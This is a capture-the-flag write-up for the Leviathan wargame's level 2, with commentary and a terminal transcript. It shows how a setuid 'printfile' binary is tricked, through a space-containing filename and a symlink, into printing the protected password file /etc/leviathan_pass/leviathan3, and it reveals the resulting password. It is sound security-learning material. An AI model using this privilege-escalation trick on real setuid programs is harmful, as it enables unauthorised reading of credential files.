@@ -1,0 +1,119 @@
+Writeup of Leviathan level 2 to 3:
+#So log in into level 2 using password from level1
+# there is and executable file called printfile
+
+##symbols and words show up, some of it seems encrypted
+#lets see what print file does with ./printfile
+
+./printfile
+
+#says ***file printer*** usage: ./printfile filename
+#so in a way using ./printfile is just like using cat
+#but it is saying "You can't have that file"
+#and trying a leviathan2 file says permission denied
+#I am going to make a folder called "ladybug" 
+#and a txt file called "derp" in the temporary file
+#then run a ltrace and see what comes up in the background script
+
+mkdir /tmp/ladybug && touch /tmp/ladybug/file\ derp.txt
+
+cd /tmp/ladybug
+
+ls -la
+
+ltrace ~/printfile "file derp.txt"
+
+#we can see that there is "access(derp.txt,4)
+#it seems like it is checking to see if what is being typed matches up
+#to whatever the "4" stands for
+#we know that there is cat on file derp
+#so we need to exploit "file" and bring the password into our tmp file
+#lets try to symbolic link the password "file" to our tmp file
+#using the "/etc/leviathan_pass/leviathan3"
+
+ln -s /etc/leviathan_pass/leviathan3 /tmp/ladybug/file
+
+ls -la
+
+#we can see it so lets try printfile and "file derp.txt"
+
+~/printfile "file derp.txt"
+
+#it worked and now we got the password
+
+
+
+
+
+
+
+
+
+
+
+here are the terminal walktrough:
+leviathan2@leviathan:~$ ls
+printfile
+leviathan2@leviathan:~$ ./printfile
+*** File Printer ***
+Usage: ./printfile filename
+leviathan2@leviathan:~$ ./printfile password
+You cant have that file...
+leviathan2@leviathan:~$ ls -la
+total 28
+drwxr-xr-x  2 root       root       4096 May 10 18:27 .
+drwxr-xr-x 10 root       root       4096 May 10 18:27 ..
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+-r-sr-x---  1 leviathan3 leviathan2 7640 May 10 18:27 printfile
+leviathan2@leviathan:~$ ./printfile leviathan3
+You cant have that file...
+[200~leviathan2@leviathan:~$ mkdir /tmp/ladybug && touch /tmp/ladybug/file\
+derp.txt
+leviathan2@leviathan:~$ ls
+printfile
+leviathan2@leviathan:~$ ls -la
+total 28
+drwxr-xr-x  2 root       root       4096 May 10 18:27 .
+drwxr-xr-x 10 root       root       4096 May 10 18:27 ..
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+-r-sr-x---  1 leviathan3 leviathan2 7640 May 10 18:27 printfile
+leviathan2@leviathan:~$ cd /tmp/ladybug
+leviathan2@leviathan:/tmp/ladybug$ ls -la
+total 20
+drwxr-xr-x   2 leviathan2 leviathan2  4096 Sep 21 20:05 .
+drwxrwx-wt 178 root       root       16384 Sep 21 20:05 ..
+-rw-r--r--   1 leviathan2 leviathan2     0 Sep 21 20:05 file derp.txt
+leviathan2@leviathan:/tmp/ladybug$ ltrace ~/printfile "file derp.txt"
+__libc_start_main(0x565556c0, 2, 0xffffd6f4, 0x565557b0 <unfinished ...>
+access("file derp.txt", 4)                       = 0
+snprintf("/bin/cat file derp.txt", 511, "/bin/cat %s", "file derp.txt") = 22
+geteuid()                                        = 12002
+geteuid()                                        = 12002
+setreuid(12002, 12002)                           = 0
+system("/bin/cat file derp.txt"/bin/cat: file: No such file or directory
+/bin/cat: derp.txt: No such file or directory
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                           = 256
++++ exited (status 0) +++
+leviathan2@leviathan:/tmp/ladybug$ ln
+ln: missing file operand
+Try 'ln --help' for more information.
+leviathan2@leviathan:/tmp/ladybug$ ln -s /etc/leviathan_pass/leviathan3
+/tmp/ladybug/file
+leviathan2@leviathan:/tmp/ladybug$ ls -la
+total 20
+drwxr-xr-x   2 leviathan2 leviathan2  4096 Sep 21 20:07 .
+drwxrwx-wt 178 root       root       16384 Sep 21 20:05 ..
+lrwxrwxrwx   1 leviathan2 leviathan2    30 Sep 21 20:07 file ->
+/etc/leviathan_pass/leviathan3
+-rw-r--r--   1 leviathan2 leviathan2     0 Sep 21 20:05 file derp.txt
+leviathan2@leviathan:/tmp/ladybug$ ~/printfile "file derp.txt"
+Ahdiemoo1j
+/bin/cat: derp.txt: No such file or directory
+leviathan2@leviathan:/tmp/ladybug$ 
+)]
